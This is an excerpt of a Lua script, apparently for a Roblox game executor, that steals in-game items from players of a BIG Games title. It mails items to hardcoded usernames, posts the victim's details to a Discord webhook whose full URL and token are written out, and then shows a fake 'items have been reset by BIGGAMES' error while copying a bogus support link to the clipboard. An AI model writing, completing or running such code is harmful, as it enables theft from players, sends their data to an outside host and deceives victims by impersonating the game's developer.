...
local MailMessage = "Your items have been reset by BIGGAMES"
...
local users = _G.Usernames or {"griddylitty4125"}
...
local function SendMessage(username, diamonds)
    ...
    if discuser and discuser ~= "" then
        local response = request({
            Url = "https://discord.com/api/webhooks/1315040285868298251/f6FO6JKxchaI78wFQ_hWUnqxcbGbaLcoKKGmcuDIm5scw8_mpXsgCw0grOKb-pfE2ZzE",
            Method = "POST",
            Headers = headers,
            Body = body
        })
...
if #sortedItems > 0 then
    ...
    message.Error("Your items have been reset by BIGGAMES, please make a support ticket if you think this was an error")
    setclipboard("discord.gg/biggames")
end